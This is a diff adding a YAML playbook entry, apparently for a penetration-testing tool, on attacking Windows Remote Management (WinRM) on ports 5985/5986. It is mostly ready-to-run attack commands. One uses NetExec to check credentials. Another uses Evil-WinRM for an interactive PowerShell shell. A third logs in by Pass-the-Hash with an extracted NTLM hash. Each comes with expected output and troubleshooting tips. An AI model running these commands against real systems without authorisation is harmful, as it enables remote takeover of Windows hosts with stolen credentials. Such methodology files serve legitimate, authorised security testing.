@@ -1,0 +1,55 @@
+id: winrm
+name: Windows Remote Management (WinRM - Port 5985 / 5986)
+category: network
+description: Methodology for WinRM management on ports 5985 (HTTP) and 5986 (HTTPS). Covers authentication probes, Evil-WinRM interactive shells, Pass-the-Hash, and PowerShell script loading.
+port_triggers:
+  - 5985
+  - 5986
+service_triggers:
+  - winrm
+  - wsman
+tags:
+  - winrm
+  - evil-winrm
+  - windows
+  - remote-shell
+steps:
+  - id: winrm-auth-check
+    title: WinRM Authentication & Access Check (NetExec)
+    phase: reconnaissance
+    purpose: Validate WinRM credentials and verify if the user belongs to Remote Management Users or Local Administrators.
+    command: netexec winrm {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}'
+    expected_output:
+      - '[+] WINRM {{TARGET}}:5985 (name:WIN-SERVER) (Pwn3d!)'
+    common_mistakes:
+      - Assuming WinRM is only for Administrators; users in `Remote Management Users` group can also log in.
+    if_success: WinRM access confirmed! Launch interactive shell with Evil-WinRM.
+    if_failure: WinRM authentication failed or user lacks remote management permissions.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
+  - id: winrm-evil-shell
+    title: Interactive PowerShell Shell (Evil-WinRM)
+    phase: exploitation
+    purpose: Spawn a high-performance interactive PowerShell terminal with built-in script loading, file transfers, and in-memory execution.
+    command: evil-winrm -i {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}'
+    expected_output:
+      - '*Evil-WinRM* PS C:\Users\{{USERNAME}}\Documents>'
+    common_mistakes:
+      - Not testing Pass-the-Hash with `-H {{HASH}}` if only NTLM hash is known.
+    if_success: Interactive shell acquired! Proceed to Windows privilege escalation triage.
+    if_failure: Connection rejected. Try SSL mode with `-s` if port 5986 is open.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
+  - id: winrm-pth-shell
+    title: Pass-the-Hash WinRM Login
+    phase: exploitation
+    purpose: Authenticate over WinRM using an extracted 32-character NTLM password hash without cracking it.
+    command: evil-winrm -i {{TARGET}} -u '{{USERNAME|Administrator}}' -H '{{HASH}}'
+    expected_output:
+      - '*Evil-WinRM* PS C:\Users\Administrator\Documents>'
+    common_mistakes:
+      - Supplying the full `LM:NTLM` string; Evil-WinRM requires only the 32-character NTLM hash part.
+    if_success: Administrator access confirmed via Pass-the-Hash!
+    if_failure: UAC remote restrictions blocking Local Admin. Check `LocalAccountTokenFilterPolicy`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
